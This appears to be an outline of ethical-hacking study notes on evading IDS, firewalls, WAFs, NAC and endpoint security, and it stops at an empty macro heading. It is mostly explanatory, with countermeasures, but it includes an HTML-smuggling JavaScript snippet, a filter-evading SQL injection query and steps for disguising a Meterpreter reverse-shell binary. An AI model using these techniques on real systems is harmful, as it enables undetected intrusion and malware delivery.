				- Attackers can leverage the Bitvise SSH Server/Client tool to establish an SSH tunnel, bypassing IDS/firewalls and accessing restricted services in a target network through various port-forwarding methods.
				- Port-Forwarding Methods for SSH Tunneling Using Bitvise:
					- Local Port Forwarding: Local port forwarding redirects a local port to a remote port through an SSH tunnel, enabling access to remote services as if they were running locally. This technique allows attackers to reach internal resources that are otherwise inaccessible from outside the network.
					- Remote Port Forwarding: Remote port forwarding exposes a local service to a remote network by forwarding it to a local port on the remote machine. This technique enables attackers to access target-side applications or development environments within a remote network.
					- Dynamic Port Forwarding: Dynamic port forwarding creates a SOCKS proxy through an SSH tunnel, allowing the routing of various types of network traffic. This highly flexible method is often used to bypass firewalls, IDS, and other network restrictions, enabling access to unauthorized services without detection.
		- Bypassing IDS/Firewalls Using DNS Tunneling Method:
			- DNS tunneling is an effective technique for bypassing firewalls and intrusion detection systems (IDS) by exploiting the typically trusted nature of DNS traffic. Since DNS operates over UDP with a 255-byte limit on outbound queries and supports only alphanumeric characters and hyphens, it is well-suited for covert communication.
			- Attackers embed malicious data within DNS protocol packets, splitting the data into smaller chunks that are encoded within DNS queries and responses. This enables data exfiltration while evading detection. DNSSEC, the security extension of DNS, cannot identify abnormalities in DNS tunneling because the data is covertly embedded within legitimate DNS traffic.
			- Tools such as iodine and dnscat2 are commonly used to create DNS tunnels, allowing attackers to encode and decode data within DNS traffic effectively.
			- DNS Tunneling Using Iodine (code.kryo.se):
				- Attackers often use tools like iodine and dnscat2 to tunnel traffic through DNS port 53, bypassing network restrictions.
				- Iodine is a software program that enables IPv4 tunneling through a DNS server, allowing data transmission even when Internet access is restricted but DNS queries are allowed.
				- The tool consists of two components:
					- iodined (server): Runs on a server with a public IP address. It responds to DNS queries, decodes data from the client, accesses the Internet on behalf of the client, and then encodes responses into DNS replies.
					- iodine (client): Runs on the attacker's device, intercepting outgoing Internet traffic and encoding it into DNS queries sent to an iodined server.
				- This technique effectively allows data transmission through a DNS tunnel, bypassing firewalls and IDS.
		- Bypassing IDS/Firewall Using External Systems:
			- Attackers can evade firewall and IDS solutions by leveraging an external system that has access to the target network. This external system may include: An employee's home machine that connects to the corporate network, A remote administration machine used to manage the target network, A company-owned device located at a different physical location.
			- Steps to Bypass a Firewall/IDS Using External Systems:
				- A legitimate user accesses the corporate network through an external system.
				- The attacker intercepts the user’s traffic and steals session IDs and cookies.
				- The attacker gains access to the corporate network by bypassing the firewall/IDS and retrieves the Windows ID of the running Mozilla process on the user’s system.
				- The attacker issues an OpenURL() command to the identified window.
				- The user’s web browser is redirected to the attacker’s web server.
				- A malicious payload embedded in the attacker's web page is downloaded and executed on the user's machine.
		- Bypassing IDS/Firewall Using MITM Attacks:
			- Many security administrators focus on preventing external or internal threats from bypassing their firewall/IDS, often overlooking the fact that these security measures can be evaded through Man-in-the-Middle (MITM) attacks targeting DNS servers.
			- In MITM attacks, attackers manipulate DNS servers and routing techniques to circumvent firewall/IDS restrictions. This can be achieved by: Compromising the corporate DNS server to control domain name resolution and Spoofing DNS responses to redirect users to malicious sites.
			- Steps to Bypass a Firewall/IDS Using a MITM Attack:
				- The attacker performs DNS server poisoning, injecting false records into the DNS cache.
				- User A requests access to www.certifiedhacker.com from the corporate DNS server.
				- The compromised DNS server responds with the attacker’s IP address (127.22.16.64).
				- User A unknowingly connects to the attacker's malicious server instead of the legitimate one.
				- The attacker forwards the connection to the real host, tunneling the user's HTTP traffic, making it appear legitimate to the firewall/IDS.
				- Malicious code embedded in the attacker's webpage is downloaded and executed on the user’s machine, bypassing firewall/IDS detection.
		- Bypassing IDS/Firewall Using Malicious Content:
			- In this method, an attacker delivers malicious content to a user and tricks them into opening it, allowing the embedded code to execute. Attackers often use steganography or obfuscation techniques to hide malicious code within legitimate files, making it difficult for IDS to detect and firewall rules to block. A wide range of file formats for text, multimedia, and graphics can be used to deliver malicious content.
			- For example, an attacker might send an email containing a malicious executable file or a Microsoft Office document that exploits macro vulnerabilities. Attackers can also target WWW/FTP servers, embedding Trojan horse files within software installation packages, mobile applications, and other seemingly harmless downloads to lure users into opening them.
			- Common File Formats Used for Malicious Content:
				- Executable & Scripting Files: EXE, COM, BAT, PS
				- Documents & Spreadsheets:
					- Microsoft Word: DOC, DOT, CNV, ASD
					- Microsoft Excel: XLS, XLB, XLT
					- Microsoft PowerPoint: PPT, PPS, POT
					- Microsoft Outlook: MSG, OTM
					- Microsoft Access: ADP, MDA, MDB, MDE, MDN, MDZ
				- Design & CAD Files: CDR (CorelDraw), DWG (AutoCAD), DVB
				- Other Application Files:
					- Visio: VSD
					- MS Project: MPP, MPT
					- SMM (AMI Pro)
					- PDF (Portable Document Format)
		- Bypassing IDS/WAF Using XSS Attack:
			- Cross-Site Scripting (XSS) attacks exploit vulnerabilities in web applications that fail to properly handle user input and server responses. Attackers take advantage of these weaknesses to inject malicious HTML or JavaScript code into a website, bypassing Intrusion Detection Systems (IDS) and Web Application Firewalls (WAF). Many WAFs have built-in filters to block standard XSS payloads, attackers use different encoding and obfuscation techniques to bypass them.
			- Techniques to Bypass IDS/WAF Using XSS:
				- Using ASCII Values: In this method, attackers encode the XSS payload using ASCII character codes to evade WAF filtering. The encoded payload bypasses WAF filters by avoiding direct keyword detection.
				- Using Hex Encoding: In this technique, the entire XSS payload is converted into hexadecimal values, making it difficult for IDS/WAF to detect malicious intent. These payload is often generated using online converters (e.g., ConvertString.com) and successfully evades firewall filters.
				- Using Obfuscation: Obfuscation involves modifying the case of characters or adding unnecessary elements to bypass pattern-based security filters. By mixing uppercase and lowercase characters, this variation successfully bypasses IDS/WAF filters that rely on case-sensitive keyword detection.
			- Attackers use a combination of encoding, obfuscation, and evasion techniques to bypass WAF and IDS protections. Security administrators should implement advanced input validation, content security policies (CSP), and behavior-based detection methods to mitigate XSS threats effectively.
		- Bypassing IDS/Firewall Through HTML Smuggling:
			- HTML smuggling is a web-based attack where an attacker injects malicious code into an HTML script to compromise a web page. This technique allows attackers to manipulate scripting features (e.g., HTML5, JavaScript) and evade detection by SIEM solutions, firewalls, web proxies, and email gateways. The primary goal of HTML smuggling is to successfully install a malware payload on a target system when a victim accesses a malicious link sent via phishing emails.
			- To achieve this, attackers create a malicious link by embedding a JavaScript-based blob with a compatible MIME type, ensuring the malware is automatically downloaded upon execution. Tools like HTML Smuggler can be used to craft JavaScript payloads designed to bypass firewalls and IDS, delivering them through HTML attachments. Once executed, the malware grants remote access to the attacker, enabling persistent attacks.
			- Intrusion Detection Systems (IDS) and firewalls typically expect JavaScript and HTML traffic from clients. The smuggling technique exploits this trust by using JavaScript to conceal the blob content, allowing the malware to bypass detection and establish a connection with a malicious server.
			- How HTML Smuggling Works:
				- Embedding Malware in an HTML5 Attachment or Web Page: Attackers initiate the attack by embedding malware within an HTML5 attachment or web page. When a victim clicks the malicious link, the specially crafted malware is executed on their system. (<a href="malicious.doc" download="Myfile.doc">Click</a>)
				- Creating a Malicious File Using JavaScript Blob: Instead of directly linking to a malicious file URL, attackers use JavaScript's Blob API to generate and disguise the malware payload. (var fakeBlob = new Blob([myfakeFile], {type: 'application/octet-stream'}); var myAnchorElement = document.createElement('a'); myAnchorElement.download = 'Myfile.doc';)
				- Generating a URL and Triggering the Download: Attackers create a URL for the malicious file and trick the victim into downloading it. (var myfileUrl = window.URL.createObjectURL(fakeBlob); myAnchorElement.href = myfileUrl; myAnchorElement.click();)
			- Signs of HTML Smuggling:
				- A ZIP file containing JavaScript.
				- An encrypted attachment.
				- Suspicious script code embedded within an HTML-based file.
				- Decoding of an HTML-based file using Base64.
			- Countermeasures:
				- Block the auto-execution of .js and .jse files.
				- Ensure that Office 365 email security filtering actively prevents the auto-download of malware-laden emails.
				- Verify that security devices such as firewalls and proxies restrict arbitrary server connections to the Internet.
				- Recommend users access the web using a browser with Microsoft Defender SmartScreen and network protection enabled to prevent malicious access.
				- Enable cloud-based security solutions with AI and ML-driven threat detection for proactive identification and mitigation of threats.
				- Implement Content Security Policy (CSP) headers on web servers.
				- Define a whitelist of allowed HTML tags, attributes, and protocols.
				- Encode all dynamic content before rendering it in the browser to prevent code injection.
		- Evading IDS/Firewall Through Windows BITS:
			- In a Windows environment, the Background Intelligent Transfer Service (BITS) is a standard service used to distribute automatic Windows updates globally. While BITS offers significant advantages, it can also be exploited by attackers to bypass firewalls and IDS, as organizations often overlook BITS traffic due to its continuous flow of legitimate software updates.
			- Beyond Microsoft products, BITS also allows browsers like Firefox and Chrome to download and update their latest versions even when the browser is closed. While this service is legitimate, attackers can abuse it to execute malicious applications or establish backdoors, bypassing security solutions and gaining control over a system.
			- In the context of the service host process, malware can create BITS tasks to download or upload files discreetly. This technique enables attackers to evade IDS/firewall detection while concealing payload transfers.
			- BITS transfers are asynchronous, meaning the program that initiated the job does not need to be active when the transfer is completed. Attackers can exploit this functionality by specifying any executable or command within notification commands linked to BITS jobs, allowing them to keep malicious programs running. BITS jobs can be created using the Bitsadmin command-line tool or via API function calls.
			- Once the malicious payload is executed, it can create scheduled tasks or other jobs that run in the background. Since these jobs operate at a system level, they are often considered trusted and can bypass security solutions such as firewalls and IDS/IPS.
			- How Do Attackers Exploit BITS?
				- Downloading a Malicious Binary - Attackers run the Bitsadmin command to create a job, transfer a malicious file to a remote system, and store it in a specified location.
				- Establishing Persistence - Attackers can establish persistence on a target machine by specifying a NotifyCmdLine that executes when the BITS job completes.
			- Countermeasures:
				- Use the BitsParser tool to analyze all traffic passing through BITS.
				- Avoid downloading suspicious programs or files from the internet or email.
				- Keep the operating system and BITS service updated with the latest security patches.
				- Regularly monitor the Microsoft-Windows-BITS-Client/Operational event log for unusual activities.
				- Integrate with a reputable SIEM solution to automate the monitoring and alerting of suspicious BITS activity.
				- Use Group Policy Objects (GPO) to manage and restrict BITS settings.
				- Configure BITS to limit the maximum job age and prevent jobs from running immediately.
				- Conduct regular audits of BITS jobs to detect unauthorized activity.
				- Restrict user accounts from creating BITS jobs unless necessary.
	- Techniques for Bypassing WAF:
		- Using HTTP Header Spoofing:
			- Web application firewalls allow specific queries and syntaxes that originate from internal addresses. They also enable rapid debugging of applications in test environments. Attackers exploit this functionality by sending requests with spoofed headers, tricking the target WAF and server into believing that the request originated from the internal network. Tools like Burp Suite are commonly used to manipulate HTTP headers and bypass the WAF.
		- Using Blacklist Detection:
			- Attackers can exploit the WAF's blacklist detection mechanism to bypass its security controls. To do this, they fingerprint the target WAF to identify blacklisted keywords. Once identified, they craft new regex patterns and payloads using keywords that are not included in the blacklist.
			- Example of filtered keywords: AND, OR, UNION
			- SQL query that evades detection: 1 || (SELECT username, pwd FROM employees WHERE userID = 1001) = 'admin'
		- Using Fuzzing/Brute-Forcing:
			- In this technique, attackers test the target WAF with multiple known payloads to find ways to bypass its security controls. While WAFs can typically detect fuzzing and brute-force attempts, attackers evade detection by first testing payloads on a locally connected WAF to identify those that can slip through. They then use the successful payloads against the target WAF.
			- To perform fuzzing, attackers use wordlists such as Assetnote Wordlists (wordlists.assetnote.io) and SecLists (github.com).
			- Process:
				- Load the wordlist into a fuzzer to initiate brute-force attempts.
				- Record the responses received for each fuzzed payload.
				- Use random user agents and proxy chains to further evade WAF detection.
		- Abusing SSL/TLS Ciphers;
			- In some cases, a target web server may accept connections using various SSL/TLS ciphers, but the filtering WAF might not support all of them. Attackers exploit this discrepancy to bypass the WAF.
			- First, attackers analyze the target WAF to identify its supported ciphers, often by reviewing vendor documentation. They then use tools such as sslscan2 to detect the ciphers supported by the web server. If they find a cipher that the web server supports but the WAF does not, they use that cipher to bypass the WAF and establish a direct connection with the target server.
			- Attackers commonly use tools like abuse-ssl-bypass-waf.py (github.com) and cURL (curl.se) to carry out this attack.
	- Techniques for IDS Evasion:
		- Insertion Attack:
			- Insertion attacks exploit discrepancies between an IDS and the target system’s packet processing. Attackers send malformed or manipulated packets that the IDS accepts but the target system discards, causing the IDS to misinterpret traffic as harmless. IDSs rely on pattern matching to detect threats, but attackers can insert extra data to disrupt this process. For example, modifying "phf" to "phoneyf" can prevent IDS detection of a PHF CGI attack.
			- Common insertion techniques include corrupting IP checksums—causing the IDS to process invalid packets—and manipulating Time-to-Live (TTL) fields so packets reach the IDS but expire before reaching the target. These tactics create mismatched data streams, leading the IDS to draw incorrect conclusions.
		- Evasion Attack:
			- An evasion attack occurs when an IDS discards packets that the target host accepts, allowing an attacker to exploit the system unnoticed. This attack reduces IDS accuracy and enables arbitrary attacks at the IP layer without detection.
			- Attackers achieve this by sending request fragments in packets that the IDS mistakenly rejects, effectively removing parts of the data stream from its view. For example, if an attacker sends a malicious sequence byte by byte and the IDS drops just one byte, it may fail to detect the attack. In this case, the IDS processes fewer packets than the destination system.
			- One example is an attacker opening a TCP connection with a data packet. Normally, a TCP connection begins with a handshake between two endpoints. However, since TCP handshake packets can carry data, an IDS that ignores this data is vulnerable to evasion attacks.
		- Denial-of-Service (DoS) Attack on IDS:
			- Multiple types of Denial-of-Service (DoS) attacks can disrupt an Intrusion Detection System (IDS) by exhausting its resources. Attackers target critical network processing points, forcing the IDS to allocate excessive CPU cycles, memory, disk space, and bandwidth, ultimately degrading its performance or rendering it ineffective. By exploiting these vulnerabilities, attackers can neutralize IDS defenses and evade detection.
			- Targeting IDS Resources:
				- CPU Overload: The IDS requires CPU cycles to analyze packets and compare them against stored network states. Attackers exploit computationally expensive operations, forcing the IDS into performing useless work and consuming all processing power.
				- Memory Exhaustion: IDSs need memory for pattern matching, tracking TCP connections, reassembling packets, and buffering data. Attackers identify and exploit memory-intensive operations, causing the system to allocate all memory to meaningless information.
				- Disk Space Consumption: IDS logs network activity, often storing events on disk. Attackers can flood the system with excessive events, consuming disk space and preventing legitimate alerts from being recorded.
				- Network Overload: Unlike end systems, an IDS must analyze all network traffic. Attackers can flood the network with meaningless data, overwhelming the IDS and preventing it from keeping up with legitimate activity.
			- Attacking Centralized Logging Systems: Many IDSs use central logging servers to consolidate alerts. If attackers discover the log server’s IP address, they can launch a DoS attack to slow it down or crash it. Once disabled, the IDS fails to record alerts, allowing further attacks to go unnoticed.
			- Effects of DoS Attack on IDS:
				- Device lock-up, making it unresponsive
				- Overwhelming alarms, preventing proper investigation
				- Exceeding management system capacity (e.g., databases)
				- Filling disk space, stopping attack logs from being stored
				- Consuming processing power, allowing real attacks to bypass detection
		- Obfuscation:
			- Obfuscation involves making code or data difficult to understand, often for privacy or security purposes. Attackers use this technique to evade Intrusion Detection Systems (IDS) by encoding attack payloads in a way that the target system can decode, but the IDS cannot. By leveraging obfuscation, attackers effectively evade IDS detection while successfully compromising their targets.
			- Obfuscation Techniques:
				- Path Manipulation: Attackers alter file paths in ways that confuse Host-based IDS (HIDS) while remaining valid for the target system.
				- Unicode Encoding: By encoding attack packets with Unicode characters, an attacker can bypass detection by the IDS while still being understood by a web server, such as Microsoft IIS.
				- Polymorphic Code: Attackers generate variable attack patterns to evade signature-based IDS, ensuring there is no single detectable signature.
				- Encrypted Protocols: Obfuscated attacks on HTTPS make it difficult for IDS to inspect traffic.
				- Digital Steganography: Attackers hide malicious payloads within digital files, allowing them to bypass IDS and deploy malware on target systems.
		- False Positive Generation:
			- This technique does not directly attack the target but instead triggers unnecessary IDS alerts, causing false positives—alarms generated without an actual threat. A method similar to Denial-of-Service (DoS) attacks, false positive generation overwhelms the IDS with excessive alert data. Attackers send malicious packets designed to trigger IDS alerts, flooding logs with noise. This makes it harder to distinguish real threats from false alarms.
			- By understanding the IDS's detection mechanisms, attackers can craft alerts specific to that system, further masking real attack traffic. As a result, legitimate threats blend into the noise, allowing attackers to evade detection.
		- Session Splicing:
			- Session splicing is an IDS evasion technique that exploits weaknesses in how some Intrusion Detection Systems (IDS) reconstruct sessions before performing pattern matching. Attackers split malicious traffic into numerous small packets, ensuring that no single packet contains a recognizable attack signature, making detection difficult.
			- How Session Splicing Works:
				- Fragmenting Attack Traffic: The attacker sends data in tiny portions (a few bytes per packet), avoiding IDS string matching.
				- Overloading IDS Processing: Some IDS struggle to handle an excessive number of small packets, failing to detect attack patterns.
				- Delaying Packet Transmission: If attackers know the IDS type, they can introduce delays between packets to evade reassembly-based detection. Many IDS time out reassembly after a set period, while some applications keep sessions active longer. Attackers exploit this mismatch to inject malicious payloads after the IDS stops monitoring.
				- Bypassing IDS Logging: Once session splicing succeeds, subsequent attack data bypasses IDS detection and is not logged.
			- Attackers often use tools like Nessus to perform session-splicing attacks, making detection and prevention challenging for IDS that do not properly reassemble fragmented traffic.
		- Unicode Evasion Technique:
			- Unicode is a character encoding system that ensures consistent text representation across different languages and platforms. Many standards, including Java, LDAP, and XML, require Unicode, and most operating systems and applications support it.
			- How Attackers Use Unicode for IDS Evasion: Attackers exploit Unicode character encodings (known as code points) to manipulate text in a way that bypasses pattern-matching IDS detection. The most common encoding formats used are UTF-8 and UTF-16.
			- Challenges with Unicode in IDS
				- Unicode allows multiple representations of the same character, making pattern-matching difficult.
				- Certain code points can modify previous code points, adding further complexity.
				- Different OS and applications may assign the same representation to different code points, leading to inconsistencies.
			- For example, the character \ (backslash) can be represented as 5C, C19C, or E0819C, making it difficult for IDS to detect malicious strings. Attackers leverage this by converting attack payloads into Unicode characters, effectively evading signature-based detection. Additionally, attackers encode URLs in HTTP requests using Unicode, allowing them to bypass HTTP-based attack detection in IDS.
		- Fragmentation Attack:
			- IP packets must adhere to the Maximum Transmission Unit (MTU) size when traveling across a network. If a packet exceeds this size, it is fragmented into smaller parts for transmission. Each fragment contains information such as fragment ID, offset, length, and flags, which help in reassembling the original packet at the destination.
			- Fragmentation can be exploited as an IDS evasion technique when reassembly timeouts differ between the IDS and the target system. Attackers manipulate fragmentation to send malicious payloads while bypassing IDS detection. By carefully manipulating fragmentation timeouts and packet sequences, attackers can execute stealthy attacks that bypass IDS detection.
			- Attack Scenario 1: IDS Timeout Expires Before the Target's Timeout
				- If the IDS reassembly timeout is shorter than that of the target system, attackers can delay fragment transmissions to evade detection. This allows the attack to succeed without triggering IDS alerts, as the IDS never sees the complete packet.
				- Example:
					- IDS reassembly timeout: 10 seconds
					- Target system timeout: 20 seconds
					- Attack strategy: The attacker sends the second fragment 15 seconds after the first.
					- Outcome: The IDS drops the fragment as its timeout has expired, but the target system still accepts and reassembles the full payload.
			- Attack Scenario 2: IDS Timeout Exceeds the Target's Timeout
				- If the IDS reassembly timeout is longer than that of the target system, an attacker can send misleading fragments to deceive the IDS. This technique allows attackers to fool the IDS into dropping attack data while successfully delivering the malicious payload to the target system.
				- Example:
					- IDS reassembly timeout: 60 seconds
					- Target system timeout: 30 seconds
					- Attack strategy: The attacker first sends frag-2' and frag-4' with false payloads, received by both the IDS and the target. After the target's timeout expires (30s), it discards the incomplete fragments. The attacker then sends frag-1 and frag-3 with the actual payload, causing the IDS to detect a checksum mismatch and drop the packet. Finally, the attacker resends frag-2 and frag-4 with the correct payload, allowing the target to reassemble the full attack, while the IDS remains unaware.
		- Time-To-Live (TTL) Attacks:
			- Each IP packet has a Time-To-Live (TTL) field that determines how many hops the packet can take before being discarded. Each router along the path decrements the TTL value by 1. When TTL reaches 0, the packet is dropped, and an ICMP alert is sent to the sender. Different OS use different default TTL values, allowing attackers to infer a host’s OS and network topology using tools like traceroute.
			- Attack Scenario:
				- An attacker exploits a router between the IDS and the victim by fragmenting a malicious packet:
				- Frag-1 is sent with a high TTL, reaching both the IDS and the victim.
				- Frag-2' (false payload) is sent with TTL = 1, reaching only the IDS, but not the victim (discarded by the router).
				- Frag-3 (correct payload) is sent with a high TTL, reaching both IDS and victim.
				- The IDS reassembles Frag-1, Frag-2' (false), and Frag-3, forming an invalid packet.
				- The attacker resends Frag-2 with the correct payload. The victim reassembles Frag-1, Frag-2, and Frag-3, successfully reconstructing the attack payload.
				- Since the IDS already processed the earlier (false) fragments, it does not detect the attack.
			- This technique allows attackers to bypass IDS detection by manipulating TTL values to control which fragments reach the victim versus the IDS.
		- Urgency Flag (URG) Attack:
			- The URG (Urgent) flag in TCP marks data as urgent, allowing it to be processed immediately. TCP uses an Urgent Pointer to indicate where the urgent data begins, ignoring all preceding data. If the URG flag is set, the Urgent Pointer (a 16-bit offset) points to the last byte of urgent data in the segment.
			- Exploitation Technique:
				- Some IDS do not properly handle the TCP urgency feature and process all packet data, whereas the target system processes only the urgent data. Attackers exploit this by:
				- Injecting garbage data before the urgent data.
				- The IDS reads all packet data, including garbage, whereas the target system processes only urgent data.
				- This mismatch results in the IDS and target system seeing different data, allowing attackers to bypass detection and deliver malicious payloads unnoticed.
			- According to RFC 1122, when an Urgent Pointer is used, one byte of data after the urgent data may be lost, further complicating IDS detection.
		- Invalid RST Packets Attack:
			- TCP uses 16-bit checksums for error detection and ensures reliable communication. Each transmitted segment includes a checksum, which the receiver verifies. If the checksum is incorrect, the receiver drops the packet. TCP also uses RST (Reset) packets to terminate connections. Attackers exploit this by sending RST packets with invalid checksums, leading to:
				- The IDS misinterpreting the invalid RST packet as a legitimate session termination and stopping traffic analysis.
				- The end host verifying the checksum, detecting it as invalid, and ignoring the RST packet.
				- Attackers continuing communication with the end host, while the IDS remains unaware, allowing evasion of detection.
			- Some IDS may incorrectly assume that the connection has ended after receiving the invalid RST packet, failing to monitor subsequent malicious traffic.
		- Polymorphic Shellcode:
			- A signature-based Network Intrusion Detection System (NIDS) detects attacks by matching packet data against known attack signatures. Many IDS identify common shellcode patterns embedded in exploits.
			- Polymorphic shellcode evades detection by constantly modifying its structure. Attackers achieve this by:
				- Encoding the payload and inserting a decoder before it.
				- Encrypting the shellcode using an unknown encryption algorithm, with the decryption code embedded in the attack packet.
				- Using a buffer overflow exploit to overwrite the return address, directing execution to the decryption code instead of a known shellcode signature.
			- Since the shellcode is rewritten with every transmission, traditional signature-based IDS fail to detect it, as predefined shellcode signatures become ineffective.
		- ASCII Shellcode:
			- ASCII shellcode consists solely of characters from the ASCII standard, allowing attackers to bypass character restrictions in string inputs and evade IDS pattern-matching. Like polymorphic shellcode, ASCII shellcode obscures attack strings, making IDS detection less effective.
			- However, using only ASCII characters restricts the shellcode’s functionality, as not all assembly instructions directly translate into ASCII values. To overcome this limitation, attackers use alternative instructions or a combination of ASCII-compatible operations to achieve the same execution flow while maintaining ASCII compliance.
		- Application-Layer Attacks:
			- Media files such as images, audio, and video are often compressed to enable faster data transfer. Attackers exploit flaws in compressed data to embed malicious code, making it difficult for IDS signatures to detect the attack. Many applications that process media files use compression, but if vulnerabilities exist in these applications, attacks can occur within the compressed data, bypassing IDS detection.
			- Most IDS solutions rely on pattern matching to identify attack conditions. However, attack variations, such as integer overflow exploits using different integer values, further complicate detection. When combined with compression, these techniques make signature-based IDS ineffective against such attacks.
		- Desynchronization Attacks:
			- Pre-Connection SYN:
				- This attack involves sending an initial SYN packet with an invalid TCP checksum before the actual connection is established. Depending on its design, the IDS may accept or ignore subsequent SYN packets in the same connection. If an IDS resets sequence numbers based on newly received SYN packets, attackers can send fake SYN packets with incorrect sequence numbers to desynchronize the IDS. This prevents the IDS from correctly tracking legitimate and malicious traffic.
				- If the IDS does not verify TCP checksums, the attack can proceed undetected. However, if the IDS validates checksums, attackers synchronize the attack by sending a fake sequence number to the IDS before the real connection is established.
			- Post-Connection SYN:
				- In this method, attackers desynchronize the IDS from the actual sequence numbers used by the target system. They send a SYN packet within an ongoing data stream, which contains a different sequence number but meets all other criteria to be accepted.
				- The target host ignores this SYN packet since the connection is already established, but the IDS may update its sequence number tracking based on the new SYN. As a result, the IDS fails to recognize legitimate traffic from the original stream, since it now expects a different sequence number.
				- Once the IDS is successfully resynchronized with the incorrect sequence number, attackers send an RST packet using the new sequence number to force the IDS to close its tracking of the connection, while the real communication remains unaffected.
		- Domain Generation Algorithms (DGA):
			- A domain generation algorithm (DGA) is a technique used by attackers to dynamically generate large numbers of domain names for command and control (C2) communication. This allows them to evade traditional security measures such as security gateways and signature-based filters, which typically block static IP addresses and known malicious domains. By frequently changing domains, attackers make it difficult for defenders to disrupt their operations.
			- How DGAs Work:
				- DGAs generate random-looking domain names that act as rendezvous points for malware to communicate with C2 servers. For example, a DGA might create gibberish-like domain names such as "isdfcbdjdnfuylt.ru". These domains are often unregistered, making it challenging for security tools to rely on IP reputation or domain blacklists to detect threats.
				- The DGA algorithm runs on both the attacker's infrastructure and the malware-infected machine, using a shared starting value called a "seed". This seed allows both the attacker and the malware to predict and generate the same domain names at a given time. If a security system detects or blocks a domain, the attacker can quickly switch to another, maintaining continuous communication with the C2 server.
			- Types of DGAs:
				- Attackers use different types of DGAs to improve evasion and effectiveness. Some common types include:
				- Character-based DGAs: Generates domains using randomized letters and numbers. Example: "ab5cde8.com", "xy12z34.net"
				- Pseudo Random Number Generator (PRNG) DGAs: Uses a random seed (e.g., system date/time) to generate predictable domain sequences. Example: If the seed generates 837291056, and numbers are mapped to letters (1 = a, 2 = b, etc.), the domain could be "hbeajidfg.com".
				- Dictionary-based DGAs: Combines random real words to create more legitimate-looking domain names, making detection harder. Example: "applebanana.com", "orangekiwi.net"
				- High-collision DGAs: Mimics real domain names and uses popular TLDs (.com, .org, .net), increasing the chance of generating an already-registered domain, which can confuse security systems. Example: "test.com", "demo.org"
		- Encryption:
			- Network-based intrusion detection systems (NIDS) analyze traffic from source to destination to detect threats. However, if an attacker establishes an encrypted session with the target using protocols like Secure Shell (SSH), Secure Socket Layer (SSL), or Virtual Private Network (VPN) tunnels, the IDS cannot inspect the encrypted packets. This allows attackers to transmit malicious traffic securely, bypassing IDS detection.
		- Flooding:
			- Intrusion detection systems rely on computational resources such as memory and processing power to analyze network traffic. Attackers can overload an IDS by flooding it with excessive noise or fake traffic, exhausting its resources. Once the IDS is overwhelmed, it becomes incapable of effectively analyzing legitimate traffic. At this point, attackers can inject actual malicious payloads into the network, which may go undetected due to system overload.
- Evading NAC and Endpoint Security:
	- Network Access Control (NAC) is a security mechanism designed to prevent unauthorized or unknown devices from accessing internal network resources. However, attackers often attempt to bypass NAC using various techniques to conduct malicious activities within the target network.
	- Endpoint security adds an additional layer of protection to end-user devices such as desktops, laptops, tablets, and digital printers, safeguarding them against malware and other cyber threats. Despite this, attackers employ sophisticated evasion techniques to bypass Endpoint Detection and Response (EDR) solutions, enabling them to infect devices with malware, establish command and control (C2), and maintain persistence while avoiding detection.
	- NAC and Endpoint Security Evasion Techniques:
    	- Bypassing NAC Using VLAN Hopping:
			- Attackers use VLAN hopping to gain unauthorized access to a network through the Dynamic Trunking Protocol (DTP). To establish a trunk connection with a switch, attackers send specially crafted DTP packets while configuring the switch mode to "dynamic auto" or "dynamic desirable." Once the trunk is established, attackers can access multiple VLANs, bypassing network segmentation.
			- VLAN Hopping Tools - VLANPWN:
				- VLANPWN is a simple script used for VLAN enumeration and hopping. It consists of two Python scripts designed to facilitate VLAN-hopping attacks:
				- DoubleTagging.py: Executes a VLAN-hopping attack by injecting a frame with two 802.1Q tags. Additionally, it sends a test ICMP request.
				- DTPHijacking.py: Conducts a DTP-switch spoofing/hijacking attack by sending a malicious DTP-desirable frame, converting the attacker's machine into a trunk channel. This method allows attackers to bypass VLAN segmentation and gain access to all VLAN traffic.
		- Bypassing NAC Using Pre-Authenticated Device:
			- Attackers can gain access to a pre-authenticated device and use it to bypass Network Access Control (NAC). They achieve this by inserting their own device (e.g., a Raspberry Pi) between the authenticated device and the network switch, allowing traffic to flow through their system undetected. This method enables attackers to inject unauthorized network packets while maintaining the appearance of a legitimate connection.
			- Tools to Bypass NAC Using a Pre-Authenticated Device:
				- nac_bypass_setup.sh:
					- A fundamental requirement for NAC bypassing is access to a device that has already been authenticated on the network. Attackers leverage this trusted device to log in and then introduce unauthorized network traffic from an external device.
					- This technique involves placing the attacker's system between the network switch and the authenticated device. One common approach is using a Raspberry Pi with two network adapters to facilitate the interception and relay of network communications.
				- FENRIR (github.com)
				- NACkered (github.com)
				- Silentbridge (github.com)
				- BITM (github.com)
		- Bypassing Endpoint Security Using Ghostwriting:
			- Ghostwriting is a technique used to bypass endpoint security by modifying the structure of malware code without affecting its functionality. This is achieved by deconstructing assembly code and inserting arbitrary instructions. Attackers use this method to evade antivirus detection and bypass security agents on endpoint devices by disguising malware to avoid signature-based detection.
			- Ghostwriting Tools:
				- Ghostwriting.sh:
					- Ghostwriting.sh is a tool designed to bypass antivirus software by performing binary deconstruction, inserting arbitrary assembly instructions, and reconstructing the modified code.
					- It leverages built-in Metasploit tools to automate this process.
						- It generates a Meterpreter reverse TCP binary to establish a connection with the attacker's private IP address.
						- The binary is disassembled, and junk code is inserted to evade signature-based detection.
						- The modified binary is then reassembled.
						- Finally, the script opens a web server on the attacker's machine, enabling the transfer of the modified file to the victim's machine while bypassing endpoint security systems.
		- Bypassing Endpoint Security by Exploiting Application Whitelisting:
			- Application whitelisting is a security feature in Windows designed to prevent the execution of unauthorized or malicious applications. It maintains a list of signed applications that are permitted to run on the system.
			- When a legitimate and signed application is executed, Windows searches for the required DLLs (Dynamic Link Libraries) in the same directory as the executable before checking other locations. Attackers exploit this behavior through DLL hijacking by placing a malicious DLL—named identically to the one the application is expecting—within the same directory as the executable. As a result, the malicious DLL is loaded and executed along with the legitimate application, allowing attackers to bypass endpoint security measures.
			- DLL Hijacking and Security Evasion: DLL hijacking exploits how Windows handles DLL loading and its search order, which determines where the system looks for DLLs when a program is launched. By hijacking DLL loading, attackers can:
				- Maintain persistence on a compromised system
				- Escalate privileges
				- Evade detection while executing malicious payloads
			- In addition to DLL hijacking, attackers can use built-in Windows utilities such as rundll32.exe, regsvr32.exe and PowerShell. These tools allow attackers to load malicious DLLs while bypassing security controls.
		- Bypassing Endpoint Security by Dechaining Macros:
